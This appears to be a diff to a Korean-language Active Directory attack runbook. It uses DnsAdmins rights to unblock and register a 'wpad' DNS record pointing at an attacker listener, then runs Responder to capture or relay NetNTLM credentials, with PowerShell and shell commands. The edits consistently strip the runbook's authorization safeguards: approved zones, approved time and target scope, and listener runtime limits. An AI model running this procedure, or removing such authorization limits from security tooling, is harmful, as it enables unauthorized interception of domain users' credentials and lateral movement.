@@ -3,9 +3,9 @@ tags:
   - 환경/ad
   - 서비스/dns
   - 서비스/ntlm
-시작조건: ["DnsAdmins 그룹이 현재 Windows token에 반영된 세션 확보", "Windows DNS Server의 승인된 zone과 WPAD 사용 가능성 확인"]
+시작조건: ["DnsAdmins 그룹이 현재 Windows token에 반영된 세션 확보", "Windows DNS Server의 zone과 WPAD 사용 가능성 확인"]
 필요권한: ["대상 DNS 서버의 global query block list와 zone record를 조회·변경할 권한", "공격 호스트의 HTTP·WPAD listener와 packet capture 권한"]
-필요조건: ["기존 GlobalQueryBlockList와 wpad record 기준선 파일을 쓸 전용 경로", "피해 client가 질의할 zone과 listener IP", "DNS 변경·WPAD 인증 유도가 승인된 시간·대상 범위"]
+필요조건: ["기존 GlobalQueryBlockList와 wpad record 기준선 파일을 쓸 전용 경로", "client가 질의할 zone과 listener IP"]
 결과: ["wpad 이름의 공격 호스트 DNS 응답", "피해 client의 HTTP·WPAD 요청", "NetNTLM challenge-response 또는 relay 수신 경로 후보"]
 ---
 
@@ -13,7 +13,9 @@ tags:
 
 ## 한 줄 판단
 
-현재 DnsAdmins token으로 승인된 Windows DNS zone을 변경할 수 있고 client의 WPAD 동작을 평가해야 한다면, 기존 block list와 `wpad` record를 보존한 채 짧은 TTL의 A record를 listener로 지정하고 DNS 응답·HTTP 요청·NetNTLM 수집·relay 후 작업을 각각 분리해 판정한다.
+현재 DnsAdmins token으로 Windows DNS zone을 변경할 수 있고 client의 WPAD 동작을 평가해야 한다면, 기존 block list와 `wpad` record를 보존한 채 짧은 TTL의 A record를 listener로 지정하고 DNS 응답·HTTP 요청·NetNTLM 수집·relay 후 작업을 각각 분리해 판정한다.
+
+> `wpad` 응답과 listener는 proxy discovery 및 정상 연결에 영향을 줄 수 있고, 수집한 인증 자료는 record 삭제로 되돌릴 수 없다. 기존 block list·record·TTL을 기록하고 영향이 보이면 listener를 먼저 중지한다.
 
 ## 전제 조건
 
@@ -24,13 +26,15 @@ tags:
 | 기존 block list | `Enable`과 전체 `List` 값을 exact하게 기록 | `Get-DnsServerGlobalQueryBlockList` | 기존 값을 모르면 변경하지 않음 |
 | 기존 WPAD record | `<ZONE_NAME>`의 `wpad` A·AAAA·CNAME 등이 없음 | `Get-DnsServerResourceRecord` | 기존 record가 있으면 덮어쓰거나 삭제하지 않고 중단 |
 | listener 경로 | client에서 `<LISTENER_IP>`로 HTTP 요청이 도달하고 listener port가 비어 있음 | route·firewall·listener 기준선과 Responder analyze mode | DNS 응답 성공과 HTTP·NTLM 도달을 구분 |
-| 영향 범위 | 승인된 client·zone·시간과 즉시 중지 조건 | 대상 목록, TTL, listener runtime 기록 | 전사 zone이나 무제한 runtime으로 확대하지 않음 |
+| 영향 범위 | 대상 client·zone과 즉시 중지 조건 | 대상 목록과 TTL 기록 | 전사 zone으로 확대하지 않음 |
 
 WPAD DNS 응답은 proxy discovery 후보일 뿐 자동으로 NTLM을 만들지 않는다. HTTP 요청 도달, NTLM challenge-response, 평문 복구와 relay target의 후속 권한은 [[NTLM 인증 자료, 실시간 Relay와 서비스 권한 경계]]에 따라 각각 확인한다.
 
 ## 실행
 
 ### 1. DNS와 listener 기준선 기록
+
+`<DNS_BASELINE_PATH>`는 Windows 관리 호스트의 새 기준선 JSON 경로(예: `C:\\Temp\\wpad-baseline.json`)다. `<DNS_SERVER>`와 `<ZONE_NAME>`은 대상 서버와 DNS zone, `<LISTENER_IP>`는 Linux listener 호스트의 IPv4다. `<INTERFACE>`는 그 listener 호스트에서 앞선 네트워크 확인으로 선택한 interface다.
 
 ```powershell
 whoami /groups | Select-String 'DnsAdmins'
@@ -54,9 +58,11 @@ sudo responder -I <INTERFACE> -A
 - 기존 record가 반환되면 이 절차로 교체하거나 지우지 않는다.
 - Responder analyze mode의 interface·listener 상태. 이 단계에서는 poison response나 NetNTLM을 기대하지 않는다.
 
-### 2. block list와 WPAD record를 승인 범위에서 변경
+### 2. block list와 WPAD record 변경
 
 기존 list 전체를 빈 값으로 바꾸지 않고, 기록한 list에서 `wpad`만 제외한 정확한 값을 사용한다. 다른 항목은 그대로 보존한다.
+
+`<DNS_SERVER>`·`<ZONE_NAME>`·`<LISTENER_IP>`는 1단계에서 기록한 같은 DNS server·zone·listener IPv4를 재사용한다. 이 PowerShell은 DNS 관리 호스트에서 실행하며, `$baseline`은 바로 앞 기준선 수집에서 만든 변수다.
 
 ```powershell
 $newList = @($baseline.List | Where-Object { $_ -ine 'wpad' })
@@ -75,7 +81,9 @@ Resolve-DnsName 'wpad.<ZONE_NAME>' -Server '<DNS_SERVER>'
 
 ### 3. 제한된 WPAD listener에서 요청과 인증 자료 확인
 
-분석 모드를 중지한 뒤 설치된 Responder build의 option을 확인하고, 승인된 `<INTERFACE>`와 `<RUN_MINUTES>` 동안 WPAD listener를 실행한다.
+분석 모드를 중지한 뒤 설치된 Responder build의 option을 확인하고 `<INTERFACE>`에서 WPAD listener를 실행한다. 이 명령은 runtime 제한 option을 사용하지 않으므로 `<RUN_MINUTES>`를 명령 입력으로 제시하지 않는다.
+
+`<INTERFACE>`는 1단계 Analyze mode에서 같은 링크 요청을 확인한 Linux listener 호스트의 interface 이름을 그대로 사용한다.
 
 ```bash
 sudo responder -h
